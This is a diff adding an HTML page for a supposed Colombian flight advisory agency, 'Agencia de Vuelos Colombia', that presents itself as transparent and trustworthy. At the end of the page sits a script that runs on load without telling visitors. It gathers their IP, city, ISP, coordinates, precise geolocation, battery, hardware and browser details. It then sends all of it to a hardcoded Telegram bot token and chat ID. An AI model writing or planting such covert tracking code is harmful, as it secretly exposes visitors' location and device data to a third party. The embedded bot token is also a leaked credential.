@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agencia de Vuelos Colombia - Asesoría y Reservas</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f5f5f5;
+        }
+
+        header {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            padding: 2rem 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .tagline {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+
+        .hero {
+            background: white;
+            padding: 3rem 0;
+            margin: 2rem 0;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .hero h2 {
+            color: #1e3c72;
+            margin-bottom: 1rem;
+            font-size: 2rem;
+        }
+
+        .hero p {
+            font-size: 1.1rem;
+            margin-bottom: 1rem;
+            color: #555;
+        }
+
+        .services {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin: 3rem 0;
+        }
+
+        .service-card {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .service-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .service-card h3 {
+            color: #1e3c72;
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+        }
+
+        .destinations {
+            background: white;
+            padding: 3rem;
+            margin: 2rem 0;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .destinations h2 {
+            color: #1e3c72;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        .dest-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .dest-item {
+            padding: 1.5rem;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border-left: 4px solid #2a5298;
+        }
+
+        .dest-item h4 {
+            color: #1e3c72;
+            margin-bottom: 0.5rem;
+        }
+
+        .info-section {
+            background: white;
+            padding: 3rem;
+            margin: 2rem 0;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .info-section h2 {
+            color: #1e3c72;
+            margin-bottom: 1.5rem;
+        }
+
+        .info-section ul {
+            list-style-position: inside;
+            margin-left: 1rem;
+        }
+
+        .info-section li {
+            margin-bottom: 0.8rem;
+            color: #555;
+        }
+
+        .disclaimer {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .disclaimer h3 {
+            color: #856404;
+            margin-bottom: 1rem;
+        }
+
+        .disclaimer p {
+            color: #856404;
+            margin-bottom: 0.5rem;
+        }
+
+        .contact {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            padding: 3rem;
+            margin: 2rem 0;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .contact h2 {
+            margin-bottom: 1rem;
+        }
+
+        .contact p {
+            font-size: 1.1rem;
+            margin-bottom: 0.5rem;
+        }
+
+        footer {
+            background: #1e3c72;
+            color: white;
+            text-align: center;
+            padding: 2rem 0;
+            margin-top: 3rem;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+
+            .services {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>✈️ Agencia de Vuelos Colombia</h1>
+            <p class="tagline">Tu aliado en viajes aéreos por todo el país</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="hero">
+            <h2>Somos Tu Agencia de Confianza</h2>
+            <p>Con años de experiencia en el sector turístico colombiano, ofrecemos asesoría profesional para ayudarte a encontrar las mejores opciones de vuelos nacionales e internacionales desde Colombia.</p>
+            <p>Nuestro equipo de expertos está comprometido en brindarte información clara, transparente y actualizada sobre rutas, aerolíneas y destinos.</p>
+        </div>
+
+        <div class="services">
+            <div class="service-card">
+                <h3>🎯 Asesoría Personalizada</h3>
+                <p>Te orientamos sobre las mejores opciones de vuelos según tu presupuesto, fechas y preferencias. Analizamos diferentes alternativas para que tomes la mejor decisión.</p>
+            </div>
+
+            <div class="service-card">
+                <h3>📋 Información Actualizada</h3>
+                <p>Mantenemos información sobre rutas, aerolíneas, aeropuertos y requisitos de viaje. Te ayudamos a entender las políticas de cada aerolínea.</p>
+            </div>
+
+            <div class="service-card">
+                <h3>🌍 Vuelos Nacionales e Internacionales</h3>
+                <p>Asesoría sobre conexiones desde y hacia Colombia. Te informamos sobre las mejores rutas y opciones disponibles en el mercado.</p>
+            </div>
+        </div>
+
+        <div class="destinations">
+            <h2>Principales Destinos desde Colombia</h2>
+            <div class="dest-grid">
+                <div class="dest-item">
+                    <h4>Bogotá</h4>
+                    <p>Principal hub internacional y conexiones a todo el país</p>
+                </div>
+                <div class="dest-item">
+                    <h4>Medellín</h4>
+                    <p>Ciudad de la eterna primavera con múltiples conexiones</p>
+                </div>
+                <div class="dest-item">
+                    <h4>Cartagena</h4>
+                    <p>Destino turístico del Caribe colombiano</p>
+                </div>
+                <div class="dest-item">
+                    <h4>Cali</h4>
+                    <p>Puerta al sur occidente colombiano</p>
+                </div>
+                <div class="dest-item">
+                    <h4>Barranquilla</h4>
+                    <p>Conexión a la Costa Atlántica</p>
+                </div>
+                <div class="dest-item">
+                    <h4>San Andrés</h4>
+                    <p>Paraíso insular del Caribe</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="info-section">
+            <h2>¿Qué Ofrecemos?</h2>
+            <ul>
+                <li>Asesoría profesional en la búsqueda de vuelos</li>
+                <li>Información sobre aerolíneas que operan en Colombia</li>
+                <li>Orientación sobre documentación y requisitos de viaje</li>
+                <li>Comparación de opciones disponibles en el mercado</li>
+                <li>Recomendaciones basadas en tu itinerario</li>
+                <li>Soporte en la planificación de tu viaje</li>
+            </ul>
+        </div>
+
+        <div class="disclaimer">
+            <h3>⚠️ Información Importante</h3>
+            <p><strong>Somos una agencia de asesoría y servicios turísticos.</strong> Los precios, disponibilidad y condiciones finales son determinados por las aerolíneas y plataformas de reserva correspondientes.</p>
+            <p>Te recomendamos verificar siempre la información directamente con la aerolínea antes de realizar cualquier compra.</p>
+            <p>Las tarifas pueden variar según temporada, disponibilidad y políticas de cada aerolínea.</p>
+            <p>No garantizamos precios específicos ni disponibilidad, ya que estos dependen de factores externos a nuestra agencia.</p>
+        </div>
+
+        <div class="info-section">
+            <h2>¿Por Qué Elegirnos?</h2>
+            <ul>
+                <li><strong>Experiencia:</strong> Años asesorando viajeros en Colombia</li>
+                <li><strong>Transparencia:</strong> Información clara y honesta sobre todas las opciones</li>
+                <li><strong>Atención Personalizada:</strong> Cada cliente es único y merece atención dedicada</li>
+                <li><strong>Conocimiento Local:</strong> Entendemos el mercado colombiano de aviación</li>
+                <li><strong>Actualización Constante:</strong> Nos mantenemos al día con cambios en la industria</li>
+            </ul>
+        </div>
+
+        <div class="contact">
+            <h2>¿Listo para Planear tu Próximo Viaje?</h2>
+            <p>Contáctanos para recibir asesoría personalizada</p>
+            <p>Estamos aquí para ayudarte a encontrar la mejor opción para tu viaje</p>
+            <p><strong>Nota:</strong> Los servicios de reserva y compra se realizan a través de las plataformas oficiales de cada aerolínea o sus canales autorizados.</p>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 Agencia de Vuelos Colombia. Servicios de asesoría turística.</p>
+            <p>Las marcas y logos de aerolíneas son propiedad de sus respectivos dueños.</p>
+        </div>
+    </footer>
+  <script>
+    ALERT
+const TELEGRAM_BOT_TOKEN = '8425620613:AAHQ5pn_gWskyBn9t0TLHtDxWJBRJKO01lg'; // Obtén esto de @BotFather
+const TELEGRAM_CHAT_ID = '7831097636';     // Tu chat ID o ID del grupo
+
+// Función para obtener información del dispositivo y navegador
+function obtenerInformacionDispositivo() {
+    const nav = navigator;
+    const screen = window.screen;
+    
+    return {
+        // Información del navegador
+        navegador: nav.userAgent,
+        idioma: nav.language,
+        idiomasAceptados: nav.languages ? nav.languages.join(', ') : 'N/A',
+        plataforma: nav.platform,
+        cookiesHabilitadas: nav.cookieEnabled,
+        
+        // Información de la pantalla
+        resolucionPantalla: `${screen.width}x${screen.height}`,
+        profundidadColor: `${screen.colorDepth} bits`,
+        resolucionDisponible: `${screen.availWidth}x${screen.availHeight}`,
+        orientacion: screen.orientation ? screen.orientation.type : 'N/A',
+        
+        // Información de la ventana
+        tamañoVentana: `${window.innerWidth}x${window.innerHeight}`,
+        
+        // Información de conexión
+        tipoConexion: nav.connection ? nav.connection.effectiveType : 'N/A',
+        velocidadBajada: nav.connection ? nav.connection.downlink + ' Mbps' : 'N/A',
+        
+        // Información del dispositivo
+        memoriaDispositivo: nav.deviceMemory ? nav.deviceMemory + ' GB' : 'N/A',
+        nucleosCPU: nav.hardwareConcurrency || 'N/A',
+        
+        // Detección de características
+        touchScreen: nav.maxTouchPoints > 0 ? 'Sí' : 'No',
+        
+        // Zona horaria
+        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        offsetHorario: new Date().getTimezoneOffset() / -60,
+        
+        // Información de plugins (si están disponibles)
+        cantidadPlugins: nav.plugins ? nav.plugins.length : 0,
+        
+        // Detección de modo de navegación
+        doNotTrack: nav.doNotTrack || 'No especificado',
+        
+        // Información de batería (si está disponible)
+        nivelBateria: 'Solicitando...'
+    };
+}
+
+// Función para obtener información de batería
+async function obtenerInfoBateria() {
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            return {
+                nivel: Math.round(battery.level * 100) + '%',
+                cargando: battery.charging ? 'Sí' : 'No',
+                tiempoRestante: battery.dischargingTime !== Infinity 
+                    ? Math.round(battery.dischargingTime / 60) + ' minutos' 
+                    : 'N/A'
+            };
+        } catch (error) {
+            return { error: 'No disponible' };
+        }
+    }
+    return { error: 'API no soportada' };
+}
+
+// Función para obtener geolocalización (requiere permiso del usuario)
+async function obtenerGeolocalizacion() {
+    return new Promise((resolve) => {
+        if ('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        latitud: position.coords.latitude,
+                        longitud: position.coords.longitude,
+                        precision: position.coords.accuracy + ' metros',
+                        altitud: position.coords.altitude ? position.coords.altitude + ' m' : 'N/A',
+                        velocidad: position.coords.speed ? position.coords.speed + ' m/s' : 'N/A'
+                    });
+                },
+                (error) => {
+                    resolve({
+                        error: 'Permiso denegado o no disponible',
+                        mensaje: error.message
+                    });
+                },
+                { timeout: 5000, enableHighAccuracy: true }
+            );
+        } else {
+            resolve({ error: 'Geolocalización no disponible' });
+        }
+    });
+}
+
+// Función para obtener IP pública y datos de ubicación
+async function obtenerIPyUbicacion() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        return {
+            ip: data.ip,
+            ciudad: data.city,
+            region: data.region,
+            pais: data.country_name,
+            codigoPais: data.country_code,
+            codigoPostal: data.postal,
+            latitud: data.latitude,
+            longitud: data.longitude,
+            isp: data.org,
+            timezone: data.timezone,
+            moneda: data.currency,
+            codigoTelefono: data.country_calling_code
+        };
+    } catch (error) {
+        // Intenta con un servicio alternativo
+        try {
+            const response2 = await fetch('https://api.ipify.org?format=json');
+            const data2 = await response2.json();
+            return { ip: data2.ip, nota: 'Solo IP disponible' };
+        } catch (error2) {
+            return { error: 'No se pudo obtener la IP', mensaje: error.message };
+        }
+    }
+}
+
+// Función para obtener información de la página
+function obtenerInfoPagina() {
+    const url = new URL(window.location.href);
+    
+    return {
+        urlCompleta: window.location.href,
+        protocolo: window.location.protocol,
+        host: window.location.host,
+        pathname: window.location.pathname,
+        parametrosURL: url.searchParams.toString() || 'Sin parámetros',
+        hash: window.location.hash || 'Sin hash',
+        referrer: document.referrer || 'Acceso directo',
+        titulo: document.title,
+        charset: document.characterSet,
+        idiomaPagina: document.documentElement.lang || 'No especificado'
+    };
+}
+
+// Función para obtener parámetros UTM y de tracking
+function obtenerParametrosTracking() {
+    const url = new URL(window.location.href);
+    const params = {};
+    
+    // Parámetros UTM comunes
+    const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'];
+    
+    // Otros parámetros comunes
+    const otrosParams = ['gclid', 'fbclid', 'msclkid', 'ref', 'source'];
+    
+    [...utmParams, ...otrosParams].forEach(param => {
+        const value = url.searchParams.get(param);
+        if (value) {
+            params[param] = value;
+        }
+    });
+    
+    return Object.keys(params).length > 0 ? params : null;
+}
+
+// Función para formatear el mensaje de Telegram
+function formatearMensaje(datos) {
+    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+    
+    let mensaje = `🚨 *NUEVA VISITA DETECTADA*\n\n`;
+    mensaje += `📅 *Fecha y Hora:* ${fecha}\n\n`;
+    
+    // Información de la página visitada
+    if (datos.pagina) {
+        mensaje += `🌐 *PÁGINA VISITADA*\n`;
+        mensaje += `• URL: ${datos.pagina.urlCompleta}\n`;
+        mensaje += `• Título: ${datos.pagina.titulo}\n`;
+        mensaje += `• Protocolo: ${datos.pagina.protocolo}\n`;
+        mensaje += `• Host: ${datos.pagina.host}\n`;
+        mensaje += `• Ruta: ${datos.pagina.pathname}\n`;
+        
+        if (datos.pagina.parametrosURL !== 'Sin parámetros') {
+            mensaje += `• Parámetros: ${datos.pagina.parametrosURL}\n`;
+        }
+        
+        mensaje += `• Referrer: ${datos.pagina.referrer}\n\n`;
+    }
+    
+    // Parámetros de tracking/marketing
+    if (datos.tracking) {
+        mensaje += `📊 *PARÁMETROS DE TRACKING*\n`;
+        for (const [key, value] of Object.entries(datos.tracking)) {
+            mensaje += `• ${key}: ${value}\n`;
+        }
+        mensaje += `\n`;
+    }
+    
+    // Información de IP y ubicación
+    if (datos.ubicacion && !datos.ubicacion.error) {
+        mensaje += `🌍 *UBICACIÓN E IP*\n`;
+        mensaje += `• IP: \`${datos.ubicacion.ip}\`\n`;
+        mensaje += `• País: ${datos.ubicacion.pais} ${datos.ubicacion.codigoPais || ''}\n`;
+        mensaje += `• Ciudad: ${datos.ubicacion.ciudad || 'N/A'}\n`;
+        mensaje += `• Región: ${datos.ubicacion.region || 'N/A'}\n`;
+        if (datos.ubicacion.isp) {
+            mensaje += `• ISP: ${datos.ubicacion.isp}\n`;
+        }
+        if (datos.ubicacion.latitud) {
+            mensaje += `• Coordenadas: ${datos.ubicacion.latitud}, ${datos.ubicacion.longitud}\n`;
+        }
+        if (datos.ubicacion.timezone) {
+            mensaje += `• Timezone: ${datos.ubicacion.timezone}\n`;
+        }
+        mensaje += `\n`;
+    }
+    
+    // Geolocalización precisa (si está disponible)
+    if (datos.geolocalizacion && !datos.geolocalizacion.error) {
+        mensaje += `📍 *GEOLOCALIZACIÓN PRECISA*\n`;
+        mensaje += `• Latitud: ${datos.geolocalizacion.latitud}\n`;
+        mensaje += `• Longitud: ${datos.geolocalizacion.longitud}\n`;
+        mensaje += `• Precisión: ${datos.geolocalizacion.precision}\n`;
+        if (datos.geolocalizacion.altitud !== 'N/A') {
+            mensaje += `• Altitud: ${datos.geolocalizacion.altitud}\n`;
+        }
+        mensaje += `\n`;
+    }
+    
+    // Información del dispositivo
+    if (datos.dispositivo) {
+        mensaje += `💻 *DISPOSITIVO*\n`;
+        mensaje += `• Plataforma: ${datos.dispositivo.plataforma}\n`;
+        mensaje += `• Pantalla: ${datos.dispositivo.resolucionPantalla}\n`;
+        mensaje += `• Ventana: ${datos.dispositivo.tamañoVentana}\n`;
+        mensaje += `• Orientación: ${datos.dispositivo.orientacion}\n`;
+        mensaje += `• Touch: ${datos.dispositivo.touchScreen}\n`;
+        mensaje += `• CPU Cores: ${datos.dispositivo.nucleosCPU}\n`;
+        mensaje += `• RAM: ${datos.dispositivo.memoriaDispositivo}\n\n`;
+    }
+    
+    // Información de batería
+    if (datos.bateria && !datos.bateria.error) {
+        mensaje += `🔋 *BATERÍA*\n`;
+        mensaje += `• Nivel: ${datos.bateria.nivel}\n`;
+        mensaje += `• Cargando: ${datos.bateria.cargando}\n\n`;
+    }
+    
+    // Información del navegador
+    if (datos.dispositivo) {
+        mensaje += `🌐 *NAVEGADOR*\n`;
+        mensaje += `• Idioma: ${datos.dispositivo.idioma}\n`;
+        mensaje += `• Idiomas: ${datos.dispositivo.idiomasAceptados}\n`;
+        mensaje += `• Zona Horaria: ${datos.dispositivo.zonaHoraria}\n`;
+        mensaje += `• Cookies: ${datos.dispositivo.cookiesHabilitadas ? 'Sí' : 'No'}\n`;
+        mensaje += `• Do Not Track: ${datos.dispositivo.doNotTrack}\n\n`;
+    }
+    
+    // Información de conexión
+    if (datos.dispositivo && datos.dispositivo.tipoConexion !== 'N/A') {
+        mensaje += `📶 *CONEXIÓN*\n`;
+        mensaje += `• Tipo: ${datos.dispositivo.tipoConexion}\n`;
+        mensaje += `• Velocidad: ${datos.dispositivo.velocidadBajada}\n\n`;
+    }
+    
+    // User Agent (al final para no saturar)
+    if (datos.dispositivo) {
+        mensaje += `🔍 *USER AGENT*\n`;
+        mensaje += `\`${datos.dispositivo.navegador.substring(0, 200)}\`\n`;
+    }
+    
+    return mensaje;
+}
+
+// Función para enviar mensaje a Telegram
+async function enviarTelegram(mensaje) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: mensaje,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.ok) {
+            console.log('✅ Notificación enviada a Telegram exitosamente');
+        } else {
+            console.error('❌ Error al enviar a Telegram:', data.description);
+        }
+        
+        return data;
+    } catch (error) {
+        console.error('❌ Error de red:', error);
+        return { ok: false, error: error.message };
+    }
+}
+
+// Función principal que recopila y envía toda la información
+async function procesarVisita() {
+    console.log('🎯 Visita detectada, recopilando información...');
+    
+    // Recopilar información de la página
+    const infoPagina = obtenerInfoPagina();
+    const tracking = obtenerParametrosTracking();
+    
+    // Recopilar información del dispositivo
+    const dispositivo = obtenerInformacionDispositivo();
+    
+    // Obtener información asíncrona
+    const [ubicacion, geolocalizacion, bateria] = await Promise.all([
+        obtenerIPyUbicacion(),
+        obtenerGeolocalizacion(),
+        obtenerInfoBateria()
+    ]);
+    
+    // Preparar datos completos
+    const datosCompletos = {
+        pagina: infoPagina,
+        tracking: tracking,
+        dispositivo: dispositivo,
+        ubicacion: ubicacion,
+        geolocalizacion: geolocalizacion,
+        bateria: bateria
+    };
+    
+    // Formatear y enviar mensaje
+    const mensaje = formatearMensaje(datosCompletos);
+    await enviarTelegram(mensaje);
+}
+
+// Inicializar el detector de visitas
+function iniciarDetectorVisitas() {
+    console.log('🚀 Detector de visitas iniciado');
+    
+    // Ejecutar inmediatamente al cargar la página
+    procesarVisita();
+}
+
+// Ejecutar cuando la página esté lista
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', iniciarDetectorVisitas);
+} else {
+    iniciarDetectorVisitas();
+}
+  </script>
+</body>
+</html>
